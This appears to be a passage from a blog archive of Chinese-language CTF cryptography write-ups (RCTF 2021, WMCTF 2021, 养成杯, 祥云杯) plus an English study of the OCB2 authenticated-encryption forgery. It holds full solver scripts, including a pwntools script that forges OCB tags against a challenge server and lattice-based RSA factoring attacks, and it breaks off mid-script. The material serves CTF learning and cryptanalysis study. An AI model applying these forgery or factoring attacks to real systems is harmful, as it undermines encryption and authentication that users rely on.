2021","permalink":"/achieve/2019to2021/cpplearn/","section":"archive","summary":"","title":"A simple tour of C"},{"content":" 👴第二次打RCTF，周末又来苟了个水题，👴太极吧菜了，全靠队友带\nuncommon1 # 气死了气死了，明明都已经把fastgcd修好了\n拿着fastgcd日了半天uncommon2，以为没用，直接扔掉了\n淦，根本没考虑过会出现同样的素数，太菜了，明明上课学过的😀😀😀\nFastgcd # 这是个什么玩意呢？\n众所周知GCD可以快速的算出两个数最大公约数，但如果有$N$个数我可能要算大概$N^2$次\n于是一群数学家想：能不能概一个算法吧它的复杂度降低一点？\n大概流程如下\n生成树这种概念已经太久远了，👴记不清了\n或者长这样：\nu神不知在那篇文章找到的实现流程：\n文章说复杂度为$O(N(lgN)^2lg(lgN))$\n和$N^2$相比就很舒服了\nimplement # u神的证明：\n完全没想到这一层，上学期还学过，太摆了\nfastgcd实现：\n你让👴实现这玩意👴肯定是会当场摆烂的，所以👴找到了现成的仓库\nhttps://github.com/sagi/fastgcd\n拖下来发现不能立马intsall，于是我们来着手修install\n#!/bin/bash __exists() { which $1 1\u0026gt;/dev/null 2\u0026gt;\u0026amp;1 } get=\u0026#34;fetch\u0026#34;; ! __exists fetch \u0026amp;\u0026amp; get=\u0026#34;curl -OL\u0026#34;; if [ ! -d gmp-5.0.5 ]; then if [ ! -f gmp-5.0.5.tar.bz2 ]; then $get ftp://ftp.gmplib.org/pub/gmp-5.0.5/gmp-5.0.5.tar.bz2 fi sum=`openssl sha1 gmp-5.0.5.tar.bz2 | awk -F\u0026#39; \u0026#39; \u0026#39;{print $2}\u0026#39;` if [[ $sum != \u0026#34;12a662456033e21aed3e318aef4177f4000afe3b\u0026#34; ]]; then echo \u0026#39;\u0026#39; echo \u0026#39;==========================================\u0026#39; echo \u0026#39;ERROR: could not verify gmp-5.0.5.tar.bz2;\u0026#39; echo \u0026#39;Downloaded over untrusted channel (non-https)\u0026#39; echo \u0026#39;==========================================\u0026#39; exit; fi tar xf gmp-5.0.5.tar.bz2 fi cd gmp-5.0.5 patch -p 1 \u0026lt; ../gmp-5.0.5.patch mkdir ../gmp-patched ./configure --prefix=$PWD/../gmp-patched/ make make install cd .. make 显然是$get ftp://ftp.gmplib.org/pub/gmp-5.0.5/gmp-5.0.5.tar.bz2出了问题（反正我下载不下来）\n于是上gmp官网手动下一个\n修改install.sh，修改源码报错的预编译代码\nfastgcd.c\n#define NTHREADS 4 // Get from compile-time argument? // #ifdef mpz_raw_64 // if patched gmp, use large format int i/o // #define __mpz_inp_raw mpz_inp_raw_64 // #define __mpz_out_raw mpz_out_raw_64 // #else // otherwise use normal i/o...beware 2^31 byte size limit #define __mpz_inp_raw mpz_inp_raw #define __mpz_out_raw mpz_out_raw // #endif install.sh\ntar xf gmp-5.0.5.tar.bz2 cd gmp-5.0.5 patch -p 1 \u0026lt; ../gmp-5.0.5.patch mkdir ../gmp-patched ./configure --prefix=$PWD/../gmp-patched/ make make install cd .. make 直接install编译\n提取数据为input.modle的格式\nfrom Crypto.Util.number import * from tqdm import size = 2**22 with open(\u0026#34;lN.bin\u0026#34;,\u0026#34;rb\u0026#34;) as f: data = f.read() f1 = open(\u0026#34;data\u0026#34;,\u0026#34;w+\u0026#34;) for i in tqdm(range(size)): tmp = hex(bytes_to_long(data[i*64:(i+1)*64]))[2:] f1.write(tmp+\u0026#39;\\n\u0026#39;) 开跑~~\n结果：\n比u神多花了5分钟，还是机子不太行🐨🐨🐨\nsolve # In [2]: s=0x7f2ec3455a5f6763645f5472333333333333338a2068398023 ...: In [3]: from Crypto.Util.number import * In [4]: long_to_bytes(s) Out[4]: b\u0026#39;\\x7f.\\xc3EZ_gcd_Tr3333333\\x8a h9\\x80#\u0026#39; In [5]: uncommon2 # A AGCD problem，using lattice reduce is simple to solve it\nAGCD # $n_i=p*q_i+r_i$形式的AGCD问题，利用格规约是可解的\n👴看到很多文章都有打法介绍，但是只有这篇介绍了格子的结构（\nhttps://martinralbrecht.wordpress.com/2020/03/21/the-approximate-gcd-problem/\n一把梭哈就能解uncommon2\nsolve # #! /usr/bin/sage from sage.all import * from sage.groups.generic import bsgs from Crypto.Util.number import * from Crypto.Util.number import * with open(\u0026#34;lN.bin\u0026#34;,\u0026#34;rb\u0026#34;) as f: data = f.read() f1 = open(\u0026#34;./data\u0026#34;,\u0026#34;wb\u0026#34;) size = 128 print(\u0026#39;size\u0026#39;,size) nn=[] for i in range(size): nn.append((bytes_to_long(data[i*64:(i+1)*64]))) B = [[0 for i in range(size)] for _ in range(size)] x0 = nn[0] B[0][0]=2^305 for i in range(1,size): B[0][i]=nn[i] # B[0][i]=i # print(B) # print(x0) print(\u0026#39;start LLL....\u0026#39;) for i in range(1,size): B[i][i]=-x0 B = Matrix(B) V = B.LLL() q = abs(V[0][0]) q = q\u0026gt;\u0026gt;305 print(x0-q) p = x0//q print(long_to_bytes(p)) # flag{Simpl3_LLL_TrIck} attachment # https://github.com/ljahum/crypto-challenges/tree/main/RCTF2021 refer # https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final228.pdf\nhttps://cr.yp.to/lineartime/multapps-20080503.pdf\nhttps://github.com/sagi/fastgcd\n","date":"14 September 2021","permalink":"/achieve/ctf/rctf2021/","section":"archive","summary":"","title":"Writeup for crypto in RCTF 2021"},{"content":"\r养成杯2021 # 没有报 事后看了一下附件\n密码题质量挺水的,只有一个比较有意思的题\nRSA? # 这道题拿到就是一个sage文件，给了加密的逻辑\nimport os from Crypto.Util.number import * flag = \u0026#34;GWHT{xxxxxxxxx}\u0026#34; p = getPrime(256) q = getPrime(256) n = p*q N = (p-1)*(q-1) e = 65537 Mx = bytes_to_long(os.urandom(30)) My = bytes_to_long(flag) Z1 = (Mx*My)%n inv_Z1 = inverse_mod(Z1, n) inv_2 = inverse_mod(2, n) X = ((Z1+inv_Z1)*inv_2)%n Y = My inv_Y = inverse_mod(Y, n) a = ((inv_Z1-X)*inv_Y)%n D = (a*a)%n xy = lambda (x1,y1),(x2,y2) : ((x1*x2+D*y1*y2)%n, (x1*y2+x2*y1)%n) def getloop((x,y), e): ret = (x, y) for i in range(e-1): ret = xy(ret, (x,y)) return ret print n print getloop((X, Y), e) print a # 13390709926509813526471364597371124446888078365567927211781799241724742352679484983709219580483800891886832613684875066109177882219522305348565532970795023 # (5404548088049249951619519701935576492239293254135836357417714329205323074367876875480850741613547220698045360461761929952847796420174204143917852624050110, 2110372753170830610718226848526649992911771424441223687775304654852191999130502986109306355582366065947895295520226816523397652918227241733632791793362785) # 1762039418842677123086894939949574689744108610561557889235294034870342076452734215004689409493802437034960516295735815195656138656970901855976802991519141 稍微分析一下有以下式子:\n$X=\\frac{1+M_x^2M_y^2}{2M_xM_y}$\n$Y=M_y$\n$a=\\frac{1-M_x^2M_y^2}{2M_xM_y^2}$\n$D=\\frac{(1-M_x^2M_y^2)^2}{4M_x^2M_y^4}$\n对getloop稍微分析一下可以发现\nn=0时\n$X_0=\\frac{1+M_x^2M_y^2}{2M_xM_y}$\n$Y_0=M_y$\nn=1时\n$X_1=\\frac{1+M_x^4M_y^4}{2M_x^2M_y^2}$\n$Y_1=\\frac{1+M_x^2M_y^2}{M_x}$\n又有\n$Y_1a=\\frac{1-M_x^4M_y^4}{2M_x^2M_y^2}$\n则\n$X_1-Y_1a=\\frac{2M_x^4M_y^4}{2M_x^2M_y^2}=M_x^2M_y^2$\n同理\n$X_0-Y_0a=\\frac{2M_x^2M_y^2}{2M_xM_y}=M_xM_y$\n相当于在\ndef getloop((x,y), e): ret = (x, y) for i in range(e-1): ret = xy(ret, (x,y)) return ret 中\n每次循环后都会乘上$M_yM_x$\n则解一个rsa就完事了\n在这个节骨点上👴是万万没想到一个yafu就能把n分解开。。。\nsolve\nimport libnum, gmpy2 n = 13390709926509813526471364597371124446888078365567927211781799241724742352679484983709219580483800891886832613684875066109177882219522305348565532970795023 p = 115718235064789220654263009993128325569382592506655305434488398268608329541037 q = n//p e = 65537 Xn, Yn = 5404548088049249951619519701935576492239293254135836357417714329205323074367876875480850741613547220698045360461761929952847796420174204143917852624050110, 2110372753170830610718226848526649992911771424441223687775304654852191999130502986109306355582366065947895295520226816523397652918227241733632791793362785 a = 1762039418842677123086894939949574689744108610561557889235294034870342076452734215004689409493802437034960516295735815195656138656970901855976802991519141 c = (Xn - Yn * a)%n d = gmpy2.invert(e,(p-1)*(q-1)) xy = pow(c,d,n) flag = ((1-xy*xy)*gmpy2.invert(2,n)*gmpy2.invert(xy,n)*gmpy2.invert(a,n))%n print(libnum.n2s(flag)) GWHT{pell_equation_is_very_interesting}\n","date":"12 September 2021","permalink":"/achieve/ctf/%E5%85%BB%E6%88%90%E6%9D%AF2021/","section":"archive","summary":"","title":"养成杯2021"},{"content":"\u0026ndash;\u0026gt;\nBaby_OCB # 想多了，比想象中简单。。。\n加密模式为AES.OCB，服务器提供加密和解密功能，\n$D(),E()表示aes内部的aes.encrypt,aes.decrypt$\nGet flag获取A为\nPMAC # 是一种处理author的函数，其输出结果只与内部 aes 和 header 参数有关\nencrypt # 前置：$checksum=\\bigoplus^n_{i=1}m_i$\nAES.OCB加密函数，对于除去最后一块的前面所有明文块，其满足\n$c_i=2_i⋅E(nonce)⨁E(2_i⋅E(nonce)⨁m_i)$\n而对与最后一块，其满足\n$c_n=m_n⨁E(2_n⋅E(nonce)⨁len(0^n))$\n而加密时的 tag 与其他参数，满足\n$tag=E(3\\cdot 2^n\\cdot E(nonce)\\bigoplus checksum)$\ndecrypt # decrypt AES.OCB解密函数，对于除去最后一块的前面所有明文块，其满足\n$m_i=D(c_i⨁2^i⋅E(nonce))⨁2^i⋅E(nonce)$\n而对与最后一块，其满足\n$m_n=c_n⨁E(2^n⋅E(nonce)⨁len(0^n))$\n解密时的 checktag 与其他参数，满足\n$checksum=\\bigoplus^n_{i=1}m_i$\n$checktag=E(3⋅2^n⋅E(nonce)⨁checksum)$\n同样的，如果 header\u0026gt;0\n则新的 $checktag=checktag⨁header$\nimplement # 这里我们这样构造\n$m1=len(0n)=15×b′\\x00′+b′\\x80′ m2=0=16×b′\\x00′$\n那么 m1 会被当作非最后一块加密\n$c1=2⋅E(nonce)⨁E(2⋅E(nonce)⨁m1)$\n$c2=m2⨁E(4⋅E(nonce)⨁len(0n)) =E(4⋅E(nonce)⨁len(0n))$\n随后调用解密函数时只提交 c1 ，此时会被当作最后一块解密，那么我们会发现\n$m1=c1⨁E(2⋅E(nonce)⨁m1) =2⋅E(nonce)⨁E(2⋅E(nonce)⨁len(0n))⨁E(2⋅E(nonce)⨁m1)$\n而我们构造的 m1=len(0n) ，那么显然 m1=2⋅E(nonce) ，此时，我们就能够轻松算出 $E(nonce)$ ！\n但因为AES.OCB的认证特殊性，我们需要使得伪造 tag 来通过认证检测，这里我们选择令 header 为空，那么此时的\n$checktag=E(6⋅E(nonce)⨁2⋅E(nonce)) =E(4⋅E(nonce))$\n如何能得到这个玩意呢？\n当我们再次稍微变化一下 $c1=c1⨁m1$ 后，我们发现此时\n$checktag=E(m1⨁6⋅E(nonce)⨁2⋅E(nonce)) =E(m1⨁4⋅E(nonce))=c2$\n也就是说，我们给在线 decrypt 函数提供的数据分别为： nonce 为加密时的 nonce ， tag 为 c2 ， c=c1 ， header 为空，这样就能够成功通过客户端的认证检查，并且得到\n$2⋅E(nonce) $，对 times2 函数写个逆即可求得$ E(nonce)$\n此时，我们即可对于任意的 nonce ，都能得到其对应的 $E(nonce)$ ，但是对于任意的明文 m ，并不能自如的完成任意加密，那么我们现在相当于已经有了 nonce 与其对应的 E(nonce) ，如何来完成任意加密的效果呢？\n这里我们为了便于解释，我们记 $L=E(nonce)$ 、\n$L′=E(2⋅L⨁m1) $\n那么可以轻松算得\n$L′=c1⨁2⋅L $\n我们再次使用客户端的 encrypt 函数，但这次我们的\n$nonce=2⋅L⨁m1 $，\n$m=message⨁2⋅L^′ $\n那么\n$c=2⋅L′⨁E(message⨁2⋅L^′⨁2⋅L^′)$ ，我们就能轻松算出\n$E(message)=c⨁2⋅L^′$\n我们将前面所有的过程看作一个函数，即使用一个 nonce 名额，来得到我想要的 aes.encrypt(message) ，那么此时所有的加密过程都可以在本地完成，直接在本地计算题目所需要的 cipher 与 tag ，直接打给服务器即可\nfrom pwn import * from Crypto.Util.number import * from hashlib import sha256 import string from pwnlib.util.iters import mbruteforce import base64 #context.log_level = \u0026#39;debug\u0026#39; xor = lambda s1 , s2 : bytes([x1^x2 for x1,x2 in zip(s1,s2)]) table = string.ascii_letters+string.digits def times2(input_data,blocksize = 16): assert len(input_data) == blocksize output = bytearray(blocksize) carry = input_data[0] \u0026gt;\u0026gt; 7 for i in range(len(input_data) - 1): output[i] = ((input_data[i] \u0026lt;\u0026lt; 1) | (input_data[i + 1] \u0026gt;\u0026gt; 7)) % 256 output[-1] = ((input_data[-1] \u0026lt;\u0026lt; 1) ^ (carry * 0x87)) % 256 assert len(output) == blocksize return output def times3(input_data): assert len(input_data) == 16 output = times2(input_data) output = xor_block(output, input_data) assert len(output) == 16 return output def back_times2(output_data,blocksize = 16): assert len(output_data) == blocksize input_data = bytearray(blocksize) carry = output_data[-1] \u0026amp; 1 for i in range(len(output_data) - 1,0,-1): input_data[i] = (output_data[i] \u0026gt;\u0026gt; 1) | ((output_data[i-1] % 2) \u0026lt;\u0026lt; 7) input_data[0] = (carry \u0026lt;\u0026lt; 7) | (output_data[0] \u0026gt;\u0026gt; 1) # print(carry) if(carry): input_data[-1] = ((output_data[-1] ^ (carry * 0x87)) \u0026gt;\u0026gt; 1) | ((output_data[-2] % 2) \u0026lt;\u0026lt; 7) assert len(input_data) == blocksize return input_data def xor_block(input1, input2): assert len(input1) == len(input2) output = bytearray() for i in range(len(input1)): output.append(input1[i] ^ input2[i]) return output def hex_to_bytes(input): return bytearray(long_to_bytes(int(input,16))) def pow(): io.recvuntil(b\u0026#34;XXXX+\u0026#34;) suffix = io.recv(16).decode(\u0026#34;utf8\u0026#34;) io.recvuntil(b\u0026#34;== \u0026#34;) cipher = io.recvline().strip().decode(\u0026#34;utf8\u0026#34;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=\u0026#39;fixed\u0026#39;) io.sendline(proof.encode()) def get_FLAG_data(): io.recv() io.sendline(b\u0026#39;3\u0026#39;) io.recvuntil(b\u0026#39;ciphertext: \u0026#39;) ciphertext = base64.b64decode(io.recvline()[:-1]) io.recvuntil(b\u0026#39;tag: \u0026#39;) tag = base64.b64decode(io.recvline()[:-1]) nonce = b\u0026#39;\\x00\u0026#39;*16 associate_data = b\u0026#39;from admin\u0026#39; return ciphertext,tag,nonce,associate_data def Server_Enc(msg,nonce): io.recv() io.sendline(b\u0026#39;1\u0026#39;) io.recv() io.sendline(base64.b64encode(nonce)) io.recv() io.sendline(base64.b64encode(msg)) associate_data = b\u0026#39;from baby\u0026#39; io.recvuntil(b\u0026#39;ciphertext: \u0026#39;) ciphertext = base64.b64decode(io.recvline()[:-1]) io.recvuntil(b\u0026#39;tag: \u0026#39;) tag = base64.b64decode(io.recvline()[:-1]) return ciphertext,tag def Server_Dec(nonce,cip,tag,associate_data): io.recv() io.sendline(b\u0026#39;2\u0026#39;) io.recv() io.sendline(base64.b64encode(nonce)) io.recv() io.sendline(base64.b64encode(cip)) io.recv() io.sendline(base64.b64encode(tag)) io.recv() io.sendline(base64.b64encode(associate_data)) io.recvuntil(b\u0026#39;plaintext: \u0026#39;) plaintext = base64.b64decode(io.recvline()[:-1]) return plaintext def get_my_enc(msg): nonce = bytearray(os.urandom(16)) fake_m = bytearray(b\u0026#39;\\x00\u0026#39;*15+b\u0026#39;\\x80\u0026#39;+b\u0026#39;\\x00\u0026#39;*16) cip,tag = Server_Enc(fake_m,nonce) m0 = bytearray(b\u0026#39;\\x00\u0026#39;*15+b\u0026#39;\\x80\u0026#39;) m1 = bytearray(b\u0026#39;\\x00\u0026#39;*16) c0 = cip[:16] c1 = cip[16:] enc = xor_block(Server_Dec(nonce,xor_block(c0,m0),c1,b\u0026#34;\u0026#34;),m0) A = back_times2(enc) B = enc C = xor_block(B,c0) msg = msg new_nonce = xor_block(B,m0) new_msg = xor_block(msg,times2(C)) + m1 new_msg = (bytes(new_msg)) ENC,TAG = Server_Enc(new_msg,new_nonce) #io.interactive() return xor_block(ENC[:16],times2(C)) def my_pmac(header, blocksize = 16): assert len(header) m = int(max(1, math.ceil(len(header) / float(blocksize)))) offset = get_my_enc(bytearray([0] * blocksize)) offset = times3(offset) offset = times3(offset) checksum = bytearray(blocksize) for i in range(m - 1): offset = times2(offset) H_i = header[(i * blocksize):(i * blocksize) + blocksize] assert len(H_i) == blocksize xoffset = xor_block(H_i, offset) encrypted = get_my_enc(xoffset) checksum = xor_block(checksum, encrypted) offset = times2(offset) H_m = header[((m - 1) * blocksize):] print(H_m) assert len(H_m) \u0026lt;= blocksize if len(H_m) == blocksize: offset = times3(offset) checksum = xor_block(checksum, H_m) else: H_m = H_m + b\u0026#39;\\x80\u0026#39; while len(H_m) \u0026lt; blocksize: H_m += b\u0026#39;\\x00\u0026#39; assert len(H_m) == blocksize checksum = xor_block(checksum, H_m) offset = times3(offset) offset = times3(offset) final_xor = xor_block(offset, checksum) auth = get_my_enc(final_xor) return auth if __name__ == \u0026#34;__main__\u0026#34;: # io = remote(\u0026#34;47.104.243.99\u0026#34;,10001) io = remote(\u0026#34;0.0.0.0\u0026#34;,10002) pow() F_ciphertext,F_tag,F_nonce,F_associate_data = get_FLAG_data() print(len(F_ciphertext)) FROMADMIN = my_pmac(b\u0026#39;from admin\u0026#39;) print(FROMADMIN) FROMBABY = my_pmac(b\u0026#39;from baby\u0026#39;) print(FROMBABY) F_associate_data = b\u0026#39;from baby\u0026#39; F_tag = xor_block(xor_block(F_tag, FROMADMIN),FROMBABY) print(Server_Dec(F_nonce,F_ciphertext,F_tag,F_associate_data)) io.interactive() 同类型\n津门被 红明谷 babyFogery ezlsb # analysis # 核心点是找到passwd访问Backdoor，\n再访问Leak给你 p,e,flag_enc 约等于getflag了\nMain:\n$$ \\begin{aligned} a=getPrime(512) \\\\ p =a^2+sx_1+2k_1+1\\\\ q = b^2 + sx_2+2k_2+1\\\\ n=pq\\\\ e=65537\\\\ pass_enc = pass^e\\mod n\\\\ \\end{aligned} $$\n👴推到这里就寄了\nlookback # 主要任务：4 次 Airdrop 的机会 分解 n,可以将n和gitfs写为一个加强版AGCD问题\n$$ \\begin{aligned} gift_1 =q_1a^2+q_1r_1\\\\ gift_2 =q_2a^2+q_2r_2\\\\ gift_3 =q_3a^2+q_3r_3\\\\ gift_4 =q_4a^2+q_4r_4 \\end{aligned} $$\n$n=qa^2+qr$\n对n和gifts开方可以得到AGCD的适用的条件范围\n用格子规约一下可以得到a的值\n然后用copper co一下就拿到pq了\n然后解出passwd去拿leak\nsolve # from Crypto.Util.number import * n = 47935439323457127833037357083983237496878689261127081988649381912739468031720632155196797632254382181519984640185516509133478757768213513987941266551218952702606511178276633908546681835137035411034761316782876147359960487121213984853077540707588650724919247893999205747065241005931759522778403309142776013266993947909627871209547322186129461944966954255478452004126991923307040855781751576009560486080068518925411003611155913186594087392942825850544717133800805624006483035224985413873703244911627183839595554490748948155205230203576672211733145725061218786720271669259766573150046403742640731305478008090581342450251 c = 3919344937892382453030977567508693676032303846339768189327551099374946365060960690768609451174592443590215485748150561581950399880588830921746078740240411900651523182948715415984890388869890625266181130509341855855926592096861408547012789662424413990132921065901887989126066338526922430576216968899218768929718135909294604392991675565238263427980279809833873727879908414057057251514599614783087363407160259495649433827508201133578753184878878951808963235285802411560617758684149245785926009513999665737813112781227632184408328506347530201548662504337685327938279816153782173263392272482010848912768570644687383402740 e = 0x10001 import gmpy2 gift = [n,44990368188010733918858560274483758890181415269493297111432503547349003225605998615045785893226033910128870030617267155471810954946701223520640922021975809987807505611903409246795611631098996240773157768116757200113829094343552868816290020352831816362796203792491207823175523672191727528508633850619433949770456610363882692306556232795718586073455551690290817146381615597057233415356702398751201147360489923331479498200944380380485186742204102241268627281885440725091810845139220728878887230186802227055200861696153582625239928130166788950797548542788617056657074111819043054568673588056230147076007178129781162831611, 78683096763326373669536693596249569085095290247102968419967840631586829732977219369969300751984289814402998022338838702200385790818392667580904195251832143834204909181557079203022588554330880322720341355019524178584242950915453525665150758590809948785874945747350388081180350115247240154475291948408741761648481087095447887536869026145459137082976669264740463624475908502268200243221926503732189641142315206390638626198685135408561463549566690400552904111413732721731304453362155831880117750312809828284867777234323889613356325170410656020466019958496069321445323099847122674429896323552643458809760407340317926830901, 155378045723411522600696035951116955917841229585849918356678240504530602921920566960136486129553454017727749961462685165377347755302826839915112915642536853507763599097574159709699129520153090998679336513853206496584404340204651266745291554668873684828162763771988162464321539837322058407795741726134977433737336303715635638805865795180826546489644742166424956313290523391862752963123672824271036686045932898668866001588000885565313392223064341062105415322004215058987783863547389257154167383707353247208122517429835580960973747381235079792989510459208038145580319784674535377716228024727145018179341727746440515438603, 145996826337300053358889785500361366816465399568166384938579711772423913668332754495063912415488340254571832698805395656780786821255846897561093531075917438583833034671829076937376980928330090827535202591154261056743308762095398623323354628401868490174767786058940272278982366625466222310654778128867887749716594188776848527274133080300896292575037380431855075174589507467705421620952488239054607980417485378752030675364661643727200369011640293898438494036260460375174641137939853447480714174584002881316581265441151705735968822426191526020807499157273552559963397713746419094028547071420597530907758157846952075538021] G = [] for i in gift: G.append(gmpy2.iroot(i,2)[0]) from sage.all import * M = Matrix(ZZ,4+1,4+1) for i in range(4): M[i+1,i+1] = -G[0] for i in range(4): M[0,i+1] = G[i+1] M[0,0] = 2** (368) P=M.LLL()[0] P0 = (abs(P[0])//M[0,0]) Q = [P0] #print((bin(P0))) for i in range(1,5): tmp = ((P[i]-P0*G[i])//G[0]) Q.append(tmp) import gmpy2 a = abs(G[0]//Q[0]) print(a) \u0026#39;\u0026#39;\u0026#39; N = 47935439323457127833037357083983237496878689261127081988649381912739468031720632155196797632254382181519984640185516509133478757768213513987941266551218952702606511178276633908546681835137035411034761316782876147359960487121213984853077540707588650724919247893999205747065241005931759522778403309142776013266993947909627871209547322186129461944966954255478452004126991923307040855781751576009560486080068518925411003611155913186594087392942825850544717133800805624006483035224985413873703244911627183839595554490748948155205230203576672211733145725061218786720271669259766573150046403742640731305478008090581342450251 pbar = 15606058170269190953682935674386408585241503399431015536676436247560293934016890029594865561178385431706188686337043777633715364517948170845087640826845217 ZmodN = Zmod(N) P.\u0026lt;x\u0026gt; = PolynomialRing(ZmodN) f = pbar**2 + x x0 = f.small_roots(X=2^368, beta=0.1,epsilon = 0.01) p = pbar + x0[0] print(\u0026#34;p: \u0026#34;, p) 243549051613825768264099803511229671296850562269513049496935511304072171908221622373325530141385783545202972578556352456412692718100967837804917914686772005951461971082613057233161910519390099300130916541889963526259281974154202935031489884213351283127857066122909931059096582655197258061167540446985751813009 \u0026#39;\u0026#39;\u0026#39; p = 243549051613825768264099803511229671296850562269513049496935511304072171908221622373325530141385783545202972578556352456412692718100967837804917914686772005951461971082613057233161910519390099300130916541889963526259281974154202935031489884213351283127857066122909931059096582655197258061167540446985751813009 q = 47935439323457127833037357083983237496878689261127081988649381912739468031720632155196797632254382181519984640185516509133478757768213513987941266551218952702606511178276633908546681835137035411034761316782876147359960487121213984853077540707588650724919247893999205747065241005931759522778403309142776013266993947909627871209547322186129461944966954255478452004126991923307040855781751576009560486080068518925411003611155913186594087392942825850544717133800805624006483035224985413873703244911627183839595554490748948155205230203576672211733145725061218786720271669259766573150046403742640731305478008090581342450251//p phi = (p-1)*(q-1) d = inverse(0x10001,phi) print(long_to_bytes(pow(c,d,47935439323457127833037357083983237496878689261127081988649381912739468031720632155196797632254382181519984640185516509133478757768213513987941266551218952702606511178276633908546681835137035411034761316782876147359960487121213984853077540707588650724919247893999205747065241005931759522778403309142776013266993947909627871209547322186129461944966954255478452004126991923307040855781751576009560486080068518925411003611155913186594087392942825850544717133800805624006483035224985413873703244911627183839595554490748948155205230203576672211733145725061218786720271669259766573150046403742640731305478008090581342450251))) c = 26477776136511814537867182410042935036751631193394882824790793880743251563906439761929648379057880893788211246254847830996292172157860942596330440504204415170090503913269874666809421512135396019520075970999555199447275211351781765139220570319976413703772788491129400862990098026864762589440254742120432827191 n = 462759013310826480654170350879608056333317185952185294792509715751354925534996431275210016348827150025558626490699228055937593844557693779418456113065581193070896452111537933875515496157080452283253231904539734791991415148758529596162008849892665895353050001859515122987866725231231752910748407229540350263791 c1 = pow(c,inverse(4096,n-1),n) c2 = pow(c1,(n+1)//4,n) print(long_to_bytes(n-c2)) Attachment # WMCTF2021 ","date":"31 August 2021","permalink":"/achieve/ctf/wmctf2021/","section":"archive","summary":"","title":"WMCTF 2021"},{"content":"\rA study of Cryptanalysis of OCB2 # Introduction (TL;DR) # Authenticated encryption (AE) is a term used to describe encryption systems that simultaneously protect confidentiality and authenticity (integrity) of communications; that is, AE provides both message encryption and message authentication of a plaintext block or message .\nThe offset codebook block cipher mode (OCB)\nOCB provide an extremely efficient algorithm, equal to or more efficient than other AE algorithms. OCB is a cipher mode and we can apply ocb to AES/DES/SM4 etc.\nThe following paragraph briefly introduces OCB1 and OCB2\nOCB1 # Figure 1 shows the overall structure for OCB encryption and authentication.\nThe message M to be encrypted and authenticated is divided into n-bit blocks, with the exception of the last block, which may be less than n bits. Typically, n = 128.\nenc\nInput:$(N,M)$\nOutput:$(C,T)$\nThe calculation of the Z[i] is somewhat complex and is summarized in the following equations\nThe operator · refers to multiplication over the finite field $GF(2^{128})$with the irreducible polynomial $m(x) = x^{128} + x^7 + x^2 + 1 $.\nThe operator ntz(i) denotes the number of trailing (least significant) zeros in i\nThe meanings of other notation are as follows\n$checksum = M[1] \\oplus M[2] \u0026hellip;\\oplus Y[m]\\oplus C[m]||0*$\n$tag = first \\; \\tau \\; bits \\; of \\; E_K(checksum\\oplus Z[m])$\nThe following figure summarizes the OCB algorithms for encryption and decryption\nOCB2 # We denote with $msb_c(X)$ and $lsb_c(X)$ the first and last c ≤ |X| bits of X respectively.\nThe mode’s key space K is that of the underlying blockcipher E\nthe latter is required to have block length n = 128 (in particular, AES is suitable)\nthe nonce space is $N = {0, 1}^n$\nthe message space $M$ and the AD space A are the set {0, 1} of strings of arbitrary length\n$\\sum means \\; checksum \\; in \\; OCB2$\n$\\epsilon$ means empty\nn $len(X)$ denotes an n-bit encoding of |X|,\n$D_E(N,A,C,T)$ decrypt the C and use M to recalculate $\\sum$\nso, T is related with A and M\nThe main case is the $2^mL$ generation\nBasic Attacks (Minimal Forgery Attack) # We give the minimal example of against OCB2.\nThe rests are in the attachment\nEncrypt $(N, A, M)$ where $N$is any nonce, $A = \\epsilon $ is empty, and $M$ is the 2n-bit message\n$M = M[1]||M[2]$ where\nThe encryption oracle returns a pair $(C, T) $consisting of a 2n-bit ciphertext $C = C[1] || C[2]$ and a tag $T$.\nconstructing parameters are as follows :\nlenth of $C\u0026rsquo;$ is n,the half of $M$\nDecrypt $(N\u0026rsquo; , A\u0026rsquo; , C\u0026rsquo; , T\u0026rsquo; ) $\npseudocode:\nM[0] (in hex) = 00000000000000000000000000000080\rM[1] (in hex) = 0053cc74d9fba8588190c414aff6e6a2\rC, T = encrypt(N, M)\rC_ = C[0] ^ M[0]\rT_ = M[1] ^ C[1]\rauth, M_ = decrypt(N, C_, T_) prove # In this poc $T\u0026rsquo;$ decryptde as pad\nas the $A$ is empty，this breaks the authenticity of OCB2.\nexercise case # Oil Circuit Breaker: https://ctftime.org/task/10227\noops2: https://ctftime.org/task/7217\nReferences # Plaintext Recovery Attack of OCB2,2018\nCryptanalysis of OCB2,2018\nCryptanalysis of OCB2:Attacks on Authenticity and Confidentiality,2019/311\nOCB2-POC\nAttachmant # Download ","date":"29 August 2021","permalink":"/articles/ocb2/","section":"Projects","summary":"","title":"A simple study of OCB2"},{"content":"\rWriteUp for crypto in 翔云ber 2021 # 👴第二次打祥云杯，周日来苟了几个水题\nRandom_RSA # 把代码反过来写就完事了\n但是要注意题目random.seed是在python2环境下算出的数据。。。。有点坑了\nfrom Crypto.Util.number import * import random seeds = [4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579] res = [55, 5, 183, 192, 103, 32, 211, 116, 102, 120, 118, 54, 120, 145, 185, 254, 77, 144, 70, 54, 193, 73, 64, 0, 79, 244, 190, 23, 215, 187, 53, 176, 27, 138, 42, 89, 158, 254, 159, 133, 78, 11, 155, 163, 145, 248, 14, 179, 23, 226, 220, 201, 5, 71, 241, 195, 75, 191, 237, 108, 141, 141, 185, 76, 7, 113, 191, 48, 135, 139, 100, 83, 212, 242, 21, 143, 